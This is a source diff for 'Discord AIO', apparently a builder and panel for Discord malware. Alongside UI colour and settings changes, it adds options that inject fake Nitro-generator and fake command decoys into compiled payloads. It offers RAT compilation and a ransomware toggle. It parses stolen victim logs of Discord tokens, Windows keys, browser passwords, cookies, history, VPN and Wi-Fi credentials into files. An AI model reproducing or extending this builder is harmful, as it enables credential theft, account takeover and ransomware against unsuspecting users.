@@ -23,7 +23,7 @@ namespace discordAIO6
 {
     public partial class dAIOmain : Form
     {
-        private static string version = "0.6.1";
+        private static string version = "0.6.2";
 
         public DiscordRpcClient dc_client;
 
@@ -31,6 +31,8 @@ namespace discordAIO6
         private static extern IntPtr CreateRoundRectRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect, int nWidthEllipse, int nHeightEllipse);
         private static string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
         private string aioDir = appdata + "\\Discord AIO";
+
+        private string cButton = "red";
 
         public dAIOmain()
         {
@@ -57,6 +59,36 @@ namespace discordAIO6
             usernameLabel.Text = Environment.UserName;
             versionLabel.Text = version;
             navLabel.Text = lmain;
+
+            string color = Properties.Settings.Default["ui_Color"].ToString();
+            if (color == "red")
+            {
+                redButton_Click(new object(), new EventArgs());
+            }
+            else if (color == "green")
+            {
+                button1_Click(new object(), new EventArgs());
+            }
+            else if (color == "blue")
+            {
+                button2_Click(new object(), new EventArgs());
+            }
+            else if (color == "white")
+            {
+                button3_Click(new object(), new EventArgs());
+            }
+
+            string ynHandler = Properties.Settings.Default["show_Username"].ToString();
+            if (ynHandler == "yes")
+            {
+                shYes_Click(new object(), new EventArgs());
+            }
+            else
+            {
+                shNo_Click(new object(), new EventArgs());
+            }
+
+
 
             refreshLanguage();
             Scintilla();
@@ -340,6 +372,8 @@ namespace discordAIO6
             redButton.FlatAppearance.BorderSize = 1;
             button3.FlatAppearance.BorderSize = 0;
 
+            cButton = "red";
+
             if (translateLabel.Text != "null")
             {
                 translateLabel.ForeColor = Color.DarkRed;
@@ -556,6 +590,11 @@ namespace discordAIO6
             ratCompileButton.ForeColor = Color.DarkRed;
             ratCompileButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
             ratCompileButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
+            saveButton.ForeColor = Color.DarkRed;
+            saveButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            saveButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
+            nitroBox.ForeColor = Color.DarkRed;
+            cmdBox.ForeColor = Color.DarkRed;
         }
 
         private void button1_Click(object sender, EventArgs e)
@@ -567,6 +606,8 @@ namespace discordAIO6
             button2.FlatAppearance.BorderSize = 0;
             redButton.FlatAppearance.BorderSize = 0;
             button3.FlatAppearance.BorderSize = 0;
+
+            cButton = "green";
 
             if (translateLabel.Text != "null")
             {
@@ -784,6 +825,11 @@ namespace discordAIO6
             ratCompileButton.ForeColor = Color.LimeGreen;
             ratCompileButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
             ratCompileButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
+            saveButton.ForeColor = Color.LimeGreen;
+            saveButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            saveButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
+            nitroBox.ForeColor = Color.LimeGreen;
+            cmdBox.ForeColor = Color.LimeGreen;
 
         }
 
@@ -796,6 +842,8 @@ namespace discordAIO6
             button2.FlatAppearance.BorderSize = 1;
             button3.FlatAppearance.BorderSize = 0;
             redButton.FlatAppearance.BorderSize = 0;
+
+            cButton = "blue";
 
             if (translateLabel.Text != "null")
             {
@@ -1013,6 +1061,11 @@ namespace discordAIO6
             ratCompileButton.ForeColor = Color.DodgerBlue;
             ratCompileButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
             ratCompileButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
+            saveButton.ForeColor = Color.DodgerBlue;
+            saveButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            saveButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
+            nitroBox.ForeColor = Color.DodgerBlue;
+            cmdBox.ForeColor = Color.DodgerBlue;
         }
 
         private void button3_Click(object sender, EventArgs e)
@@ -1024,6 +1077,8 @@ namespace discordAIO6
             button2.FlatAppearance.BorderSize = 0;
             redButton.FlatAppearance.BorderSize = 0;
             button3.FlatAppearance.BorderSize = 1;
+
+            cButton = "white";
 
             if (translateLabel.Text != "null") 
             {
@@ -1241,13 +1296,22 @@ namespace discordAIO6
             ratCompileButton.ForeColor = Color.Gainsboro;
             ratCompileButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
             ratCompileButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
+            saveButton.ForeColor = Color.Gainsboro;
+            saveButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
+            saveButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
+            nitroBox.ForeColor = Color.Gainsboro;
+            cmdBox.ForeColor = Color.Gainsboro;
         }
+
+        private string ynBtn = "yes";
 
         private void shYes_Click(object sender, EventArgs e)
         {
             shNo.FlatAppearance.BorderSize = 0;
             shYes.FlatAppearance.BorderSize = 1;
             usernameLabel.Show();
+
+            ynBtn = "yes";
         }
 
         private void shNo_Click(object sender, EventArgs e)
@@ -1255,6 +1319,8 @@ namespace discordAIO6
             shNo.FlatAppearance.BorderSize = 1;
             shYes.FlatAppearance.BorderSize = 0;
             usernameLabel.Hide();
+
+            ynBtn = "no";
         }
 
         private void PopupMessage(string message)
@@ -2595,6 +2661,14 @@ namespace discordAIO6
                                     PopupMessage(poolusrname);
                                 }
                             }
+                            if (nitroBox.Checked)
+                            {
+                                text = text.Replace("//ourcoolfakenitrogen", "RunFAKENitroGEN();");
+                            }
+                            if (cmdBox.Checked)
+                            {
+                                text = text.Replace("//ourcoolfakecmd", "RunFAKEcmd();");
+                            }
 
                             // Ransom
                             if (ransomBox.Checked)
@@ -2621,7 +2695,7 @@ namespace discordAIO6
                 }
                 catch (Exception ex)
                 {
-
+                    PopupMessage(ex.ToString());
                 }
             }
         }
@@ -2670,7 +2744,6 @@ namespace discordAIO6
             string nameData = "N/A";
             string tokenData = "N/A";
             string macData = "N/A";
-            string link = "N/A";
             string winkeyData = "N/A";
 
             try
@@ -2683,63 +2756,29 @@ namespace discordAIO6
                         string creText = File.ReadAllText(open.FileName);
                         string directoryPath = Path.GetDirectoryName(open.FileName);
                         dAIObox.Text = directoryPath;
-                        if (creText.Contains("Discord AIO"))
+                        ipData = getBetween(creText, "IP Address: ", " |");
+                        nameData = getBetween(creText, "Desktop name: ", " |");
+                        macData = getBetween(creText, "MAC Address: ", " |");
+
+                        string[] lines = File.ReadAllLines(open.FileName);
+                        for (int i = 0; i < lines.Length; i++)
                         {
-                            ipData = getBetween(creText, "IP Address: ", " |");
-                            nameData = getBetween(creText, "Desktop name: ", " |");
-                            macData = getBetween(creText, "MAC Address: ", " |");
-
-                            string[] lines = File.ReadAllLines(open.FileName);
-                            for (int i = 0; i < lines.Length; i++)
+                            if (lines[i].Contains("# End of Tokens") && i >= 2)
                             {
-                                if (lines[i].Contains("# End of Tokens") && i >= 2)
-                                {
-                                    tokenData = lines[i - 2];
-                                }
+                                tokenData = lines[i - 2];
                             }
-
-                            if (creText.Contains("# Windows"))
-                            {
-                                winkeyData = getBetween(creText, "Key: ", " |");
-                            }
-
-                            nameBox.Text = nameData;
-                            ipBox.Text = ipData;
-                            tokenBox.Text = tokenData;
-                            macBox.Text = macData;
-                            winBox.Text = winkeyData;
                         }
-                        else
+
+                        if (creText.Contains("# Windows"))
                         {
-                            string decryptedText = Decrypt(creText);
-
-                            creText = creText.Replace(creText, decryptedText);
-                            File.WriteAllText(open.FileName, creText);
-
-                            ipData = getBetween(decryptedText, "IP Address: ", " |");
-                            nameData = getBetween(decryptedText, "Desktop name: ", " |");
-                            macData = getBetween(decryptedText, "MAC Address: ", " |");
-
-                            string[] lines = File.ReadAllLines(open.FileName);
-                            for (int i = 0; i < lines.Length; i++)
-                            {
-                                if (lines[i].Contains("# End of Tokens") && i >= 2)
-                                {
-                                    tokenData = lines[i - 2];
-                                }
-                            }
-
-                            if (decryptedText.Contains("# Windows"))
-                            {
-                                winkeyData = getBetween(decryptedText, "Key: ", " |");
-                            }
-
-                            nameBox.Text = nameData;
-                            ipBox.Text = ipData;
-                            tokenBox.Text = tokenData;
-                            macBox.Text = macData;
-                            winBox.Text = winkeyData;
+                            winkeyData = getBetween(creText, "Key: ", " |");
                         }
+
+                        nameBox.Text = nameData;
+                        ipBox.Text = ipData;
+                        tokenBox.Text = tokenData;
+                        macBox.Text = macData;
+                        winBox.Text = winkeyData;
                     }
                 }
             }
@@ -2948,7 +2987,7 @@ namespace discordAIO6
                                 if (webHandler == false)
                                 {
                                     webhookSwitch = false;
-                                    PopupMessage(toomany);
+                                 //   PopupMessage(toomany);
                                     Thread.Sleep(3000);
                                     webhookSwitch = true;
                                 }
@@ -2975,7 +3014,7 @@ namespace discordAIO6
                                 if (webHandler == false)
                                 {
                                     webhookSwitch = false;
-                                    PopupMessage(toomany);
+                                //    PopupMessage(toomany);
                                     Thread.Sleep(500);
                                     webhookSwitch = true;
                                 }
@@ -3147,8 +3186,6 @@ namespace discordAIO6
                         string creText = File.ReadAllText(open.FileName);
                         string directoryPath = Path.GetDirectoryName(open.FileName);
                         dAIObox.Text = directoryPath;
-                        if (creText.Contains("Discord AIO"))
-                        {
                             if (creText.Contains("# Passwords"))
                             {
                                 passwordsData = getBetween(creText, "# Passwords", "# End of Passwords");
@@ -3224,117 +3261,19 @@ namespace discordAIO6
                                 PopupMessage(nowifinetwork);
                             }
 
-                            if (creText.Contains("# Wifi Password") && creText.Contains("# Wifi Network"))
-                            {
-                                wifiData = getBetween(creText, "Wifi Password", "# End of Wifi Password");
+                        if (creText.Contains("# Wifi Password") && creText.Contains("# Wifi Network"))
+                        {
+                            wifiData = getBetween(creText, "Wifi Password", "# End of Wifi Password");
 
-                                using (StreamWriter file = new StreamWriter("WiFiPasswords.txt"))
-                                {
-                                    foreach (string s in Regex.Split(wifiData, "\n"))
-                                        file.WriteLine(s);
-                                }
-                            }
-                            else
+                            using (StreamWriter file = new StreamWriter("WiFiPasswords.txt"))
                             {
-                                PopupMessage(nowifipass);
+                                foreach (string s in Regex.Split(wifiData, "\n"))
+                                    file.WriteLine(s);
                             }
                         }
                         else
                         {
-                            string decryptedText = Decrypt(creText);
-
-                            creText = creText.Replace(creText, decryptedText);
-                            File.WriteAllText(open.FileName, creText);
-
-                            if (decryptedText.Contains("# Passwords"))
-                            {
-                                passwordsData = getBetween(decryptedText, "# Passwords", "# End of Passwords");
-
-                                using (StreamWriter file = new StreamWriter("Passwords.txt"))
-                                {
-                                    foreach (string s in Regex.Split(passwordsData, "\n"))
-                                        file.WriteLine(s);
-                                }
-                            }
-                            else
-                            {
-                                PopupMessage(nopass);
-                            }
-
-                            if (decryptedText.Contains("# Cookies"))
-                            {
-                                cookiesData = getBetween(decryptedText, "Cookies", "# End of Cookies");
-
-                                using (StreamWriter file = new StreamWriter("Cookies.txt"))
-                                {
-                                    foreach (string s in Regex.Split(cookiesData, "\n"))
-                                        file.WriteLine(s);
-                                }
-                            }
-                            else
-                            {
-                                PopupMessage(nocookies);
-                            }
-
-                            if (decryptedText.Contains("# History"))
-                            {
-                                historyData = getBetween(decryptedText, "History", "# End of History");
-
-                                using (StreamWriter file = new StreamWriter("History.txt"))
-                                {
-                                    foreach (string s in Regex.Split(historyData, "\n"))
-                                        file.WriteLine(s);
-                                }
-                            }
-                            else
-                            {
-                                PopupMessage(nohistory);
-                            }
-
-                            if (decryptedText.Contains("# NordVPN"))
-                            {
-                                vpnData = getBetween(decryptedText, "NordVPN", "# End of NordVPN");
-
-                                using (StreamWriter file = new StreamWriter("NordVPN.txt"))
-                                {
-                                    foreach (string s in Regex.Split(vpnData, "\n"))
-                                        file.WriteLine(s);
-                                }
-                            }
-                            else
-                            {
-                                PopupMessage(novpn);
-                            }
-
-                            if (decryptedText.Contains("# Wifi Network"))
-                            {
-                                wifiNetwork = getBetween(decryptedText, "Wifi Network", "# End of Wifi Network");
-
-                                using (StreamWriter file = new StreamWriter("WiFiNetwork.txt"))
-                                {
-                                    foreach (string s in Regex.Split(wifiNetwork, "\n"))
-                                        file.WriteLine(s);
-                                }
-                            }
-                            else
-                            {
-                                PopupMessage(nowifinetwork);
-                            }
-
-                            if (decryptedText.Contains("# Wifi Password") && decryptedText.Contains("# Wifi Network"))
-                            {
-                                wifiData = getBetween(decryptedText, "Wifi Password", "# End of Wifi Password");
-
-                                using (StreamWriter file = new StreamWriter("WiFiPasswords.txt"))
-                                {
-                                    foreach (string s in Regex.Split(wifiData, "\n"))
-                                        file.WriteLine(s);
-                                }
-                            }
-                            else
-                            {
-                                PopupMessage(nowifipass);
-                            }
+                            PopupMessage(nowifipass);
                         }
                     }
                 }
@@ -3468,6 +3407,13 @@ namespace discordAIO6
             catch { }
 
             PopupMessage("Discord RAT compiled.\n[%AppData%/Discord AIO/dist]\nPlease follow the instructions.");
+        }
+
+        private void saveButton_Click(object sender, EventArgs e)
+        {
+            Properties.Settings.Default["ui_Color"] = cButton;
+            Properties.Settings.Default["show_Username"] = ynBtn;
+            Properties.Settings.Default.Save();
         }
     }
 }
